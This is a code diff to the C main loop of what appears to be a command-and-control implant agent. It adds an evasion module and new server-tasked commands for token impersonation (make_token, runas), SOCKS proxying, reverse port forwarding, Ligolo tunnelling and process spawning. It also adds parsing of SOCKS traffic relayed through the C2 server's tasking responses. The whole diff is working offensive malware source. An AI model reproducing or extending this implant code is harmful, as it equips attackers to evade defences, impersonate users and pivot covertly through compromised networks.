@@ -3,6 +3,10 @@
 #include "commands.h"
 #include "config.h"
 #include "utils.h"
+#include "evasion.h"
+#ifdef INCLUDE_CMD_SOCKS
+#include "socks.h"
+#endif
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -48,6 +52,10 @@ int current_jitter = CALLBACK_JITTER;
 int main() {
 
   srand((unsigned int)time(NULL));
+  kratos_evasion_init();
+#ifdef INCLUDE_CMD_SOCKS
+  socks_init();
+#endif
   strncpy(current_uuid, AGENT_UUID, sizeof(current_uuid) - 1);
   current_uuid[sizeof(current_uuid) - 1] = '\0';
 
@@ -200,20 +208,93 @@ int main() {
                 else if (strcmp(cmd_name, "steal_token") == 0)
                   command_steal_token(task_id, params);
 #endif
+#ifdef INCLUDE_CMD_MAKE_TOKEN
+                else if (strcmp(cmd_name, "make_token") == 0)
+                  command_make_token(task_id, params);
+#endif
+#ifdef INCLUDE_CMD_RUNAS
+                else if (strcmp(cmd_name, "runas") == 0)
+                  command_runas(task_id, params);
+#endif
 #ifdef INCLUDE_CMD_REV2SELF
                 else if (strcmp(cmd_name, "rev2self") == 0)
                   command_rev2self(task_id, params);
+#endif
+#ifdef INCLUDE_CMD_SOCKS
+                else if (strcmp(cmd_name, "socks") == 0)
+                  command_socks(task_id, params);
+#endif
+#ifdef INCLUDE_CMD_RPORTFWD
+                else if (strcmp(cmd_name, "rportfwd") == 0)
+                  command_rportfwd(task_id, params);
+#endif
+#ifdef INCLUDE_CMD_LIGOLO_START
+                else if (strcmp(cmd_name, "ligolo_start") == 0)
+                  command_ligolo_start(task_id, params);
+#endif
+#ifdef INCLUDE_CMD_LIGOLO_STOP
+                else if (strcmp(cmd_name, "ligolo_stop") == 0)
+                  command_ligolo_stop(task_id, params);
+#endif
+#ifdef INCLUDE_CMD_LIGOLO_STATUS
+                else if (strcmp(cmd_name, "ligolo_status") == 0)
+                  command_ligolo_status(task_id, params);
+#endif
+#ifdef INCLUDE_CMD_SPAWNTO
+                else if (strcmp(cmd_name, "spawnto") == 0)
+                  command_spawnto(task_id, params);
+#endif
+#ifdef INCLUDE_CMD_SPAWN
+                else if (strcmp(cmd_name, "spawn") == 0)
+                  command_spawn(task_id, params);
 #endif
               }
               cmd_local_ptr += 1;
             }
           }
+          // Parse SOCKS datagrams from get_tasking response
+#ifdef INCLUDE_CMD_SOCKS
+          {
+              const char *socks_ptr = strstr(json_resp ? json_resp : "", "\"socks\"");
+              if (socks_ptr) {
+                  // Advance to '[' of the socks array
+                  const char *arr = strchr(socks_ptr, '[');
+                  while (arr && *arr && *arr != ']') {
+                      const char *obj = strchr(arr, '{');
+                      if (!obj || obj > strchr(arr, ']')) break;
+                      // Extraire server_id
+                      char sid_str[32] = {0};
+                      const char *sid_key = strstr(obj, "\"server_id\"");
+                      if (sid_key) {
+                          const char *v = strchr(sid_key, ':');
+                          if (v) { v++; while (*v == ' ') v++; }
+                          if (v) snprintf(sid_str, sizeof(sid_str), "%.*s", 16, v);
+                      }
+                      int server_id = atoi(sid_str);
+                      // Extraire data
+                      char data_b64[8192] = {0};
+                      extract_json_string(obj, "data", data_b64, sizeof(data_b64));
+                      // Extraire exit
+                      char exit_str[8] = {0};
+                      extract_json_string(obj, "exit", exit_str, sizeof(exit_str));
+                      int exit_flag = (strcmp(exit_str, "true") == 0) ? 1 : 0;
+                      if (server_id > 0)
+                          socks_handle_incoming(server_id, data_b64, exit_flag);
+                      // Avancer au prochain objet
+                      const char *close = strchr(obj, '}');
+                      arr = close ? close : arr + 1;
+                  }
+              }
+          }
+          // Send accumulated outbound SOCKS datagrams
+          socks_send_pending();
+#endif
           free(json_resp);
         }
         free(b64_resp);
       }
     }
-    // Caluler le délai avec jitter
+    // Calculate delay with jitter
     int final_sleep = current_sleep_time;
     if (current_jitter > 0) {
       int jitter_range = (current_sleep_time * current_jitter) / 100;
